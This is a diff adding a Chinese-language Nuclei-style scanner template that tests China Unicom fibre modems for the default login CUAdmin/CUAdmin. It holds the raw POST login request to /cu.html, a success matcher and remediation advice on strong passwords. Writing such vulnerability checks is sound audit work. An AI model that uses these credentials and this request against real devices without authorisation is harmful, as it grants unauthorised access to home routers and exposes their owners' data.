@@ -1,0 +1,36 @@
+id: Chinaunicom-Default-Login
+info:
+  name: 中国联通光猫默认口令
+  author:
+  - l0ne1y
+  description: |-
+    中国联通光猫默认口令
+    中国联通光猫存在默认凭证CUAdmin/CUAdmin。使用该凭证容易被攻击者轻易进入后台，造成敏感信息泄漏。
+  severity: high
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+    #### 临时修复方案：
+    1、建议系统管理人员将已发现的弱口令立即改成强口令，并拉网式排查所有系统管理员、用户、设备的弱口令，清扫未发现的弱口令。<br />2、弱口令重在管理。企业应制定强口令制度（如：密码需包含大小写字母、数字、特殊字符至少三种格式，长度不少于十位，并且密码键盘排列无序，密码企业、个人信息无关联。<br />3、弱口令排查方式可以通过汇总企业所有人员账户后根据强口令规则匹配自查、个性化制定字典暴力破解两种方式。<br />4、推荐强口令在线生成:[https://suijimimashengcheng.51240.com/](https://suijimimashengcheng.51240.com/)<br />5、推荐口令强度在线检测:[https://howsecureismypassword.net/](https://howsecureismypassword.net/)
+requests:
+- matchers:
+  - type: status
+    status:
+    - 302
+  - type: word
+    part: header
+    words:
+    - /menu.gch
+  matchers-condition: and
+  raw:
+  - |
+    POST /cu.html HTTP/1.1
+    Host: {{Hostname}}
+
+    frashnum=&action=login&Frm_Logintoken=1&Username={{username}}&Password={{password}}&Username=&Password=
+  attack: pitchfork
+  payloads:
+    password:
+    - CUAdmin
+    username:
+    - CUAdmin
